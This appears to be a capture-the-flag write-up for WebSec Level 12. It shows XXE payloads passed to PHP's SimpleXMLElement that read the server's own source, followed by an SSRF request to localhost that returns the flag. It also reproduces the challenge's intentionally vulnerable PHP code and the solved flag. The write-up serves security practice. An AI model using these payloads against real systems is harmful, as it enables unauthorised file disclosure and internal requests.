# Level 12

1. First, there is no source code ... so we have to try and guess what's the possibility of this question.
2. Since there is the keyword "class", I google for a long time, such as "php class vulnerability", though there is no result I want. Then, I google "php class vulnerability xml". Finally, I get some information I want. 
https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
3. So, we can come up with a payload : 
    ```
    <!DOCTYPE foo [
        <!ELEMENT foo ANY> 
        <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
    <foo>&xxe; </foo>
    ```
4. Then, we have to google for the class name. I tried such as "simplexml", but it is not the right one. Then I tried "simplexmlelement" and I pass it.
5. Now, lets send the payload with : 
    ```
    'class' : 'simplexmlelement',
     'param1' : '<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]> <foo>&xxe; </foo>',
     'param2' : '2'
    ```
    p.s. I have to say that I really don't know why param2 is "2" cuz I tried a word "flag" and it said too long, then I tried "0" "1" and "2" finally sucess. I'm sorry.
6. Next, we get the base64-encode source code. After decode it, we get : 
    ```
    <!DOCTYPE html>
    <html>
    <head>
        <title>#WebSec Level Twelve</title>

        <link href="/static/bootstrap.min.css" rel="stylesheet" />
        <link href="/static/websec.css" rel="stylesheet" />

        <link rel="icon" href="/static/favicon.png" type="image/png">
    </head>
        <body>
            <div id="main">
                <div class="container">
                    <div class="row">
                        <h1>LevelTwelve <small> - This time, it's different.</small></h1>
                    </div>
                    <div class="row">
                        <p class="lead">
                            Since we trust you <em>very much</em>, you can instanciate a class of your choice, with two arbitrary parameters.</br>
                            Well, except the dangerous ones, like <code>splfileobject</code>, <code>globiterator</code>, <code>filesystemiterator</code>,
                            and <code>directoryiterator</code>.<br>
                            Lets see what you can do with this.
                                    </p>
                    </div>
                </div>
                <br>
                <div class="container">
                    <div class="row">
                        <form name="username" method="post" class="form-inline">
                            <samp>
                            <div class="form-group">
                                <label for="class" class="sr-only">class</label>
                                echo <span class='text-success'>new</span>
                                <input type="text" class="form-control" id="class" name="class" placeholder="class" required>
                                (
                            </div>
                            <div class="form-group">
                                <label for="param1" class="sr-only">first parameter</label>
                                <input type="text" class="form-control" id="param1" name="param1" placeholder="first parameter" required>
                                ,
                            </div>
                            <div class="form-group">
                                <label for="param2" class="sr-only">second parameter</label>
                                <input type="text" class="form-control" id="param2" name="param2" placeholder="second parameter" required>
                                );
                            </div>
                            </samp>
                                <button type="submit" class="btn btn-default">launch!</button>
                        </form>
                    </div>
                    <?php
                    ini_set('display_errors', 'on');
                    ini_set('error_reporting', E_ALL);

                    if (isset ($_POST['class']) && isset ($_POST['param1'])  && isset ($_POST['param2'])) {
                        $class = strtolower ($_POST['class']);

                        if (in_array ($class, ['splfileobject', 'globiterator', 'directoryiterator', 'filesystemiterator'])) {
                    die ('Dangerous class detected.');
                        } else {
                    $result = new $class ($_POST['param1'], $_POST['param2']);
                    echo '<br><hr><br><div class="row"><pre>' . $result . '</pre></div>';
                }
                    }
                    ?>
                </div>
            </div>
        </body>
    </html>

    <?php
    /*
    Congratulation, you can read this file, but this is not the end of our journey.

    - Thanks to cutz for the QA.
    - Thanks to blotus for finding a (now fixed) weakness in the "encryption" function.
    - Thanks to nurfed for nagging us about a cheat
    */

    $text = 'Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==';
    $key = ini_get ('user_agent');

    if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
        if ($_SERVER['HTTP_USER_AGENT'] !== $key) {
            die ("Cheating is bad, m'kay?");
        }

        $i = 0;
        $flag = '';
        foreach (str_split (base64_decode ($text)) as $letter) {
            $flag .= chr (ord ($key[$i++]) ^ ord ($letter));
        }
        die ($flag);
    }
    ?>

    ```
    We can ignore most of it and look up to : 
    ```
    if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1')
    ```
    So, it's pretty clear that this is a SSRF attack. Here is the payload. Of course, we still need XXE attack. 
    ```
    <!DOCTYPE foo [
        <!ELEMENT foo ANY> 
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php">]> 
    <foo>&xxe; </foo>
    ```
    Do the same thing exactly as before, just remember to change param1, then decode the message and get the flag : 
7. Here is the flag : WEBSEC{Many_thanks_to_hackyou2014_web400_MSLC_<3}
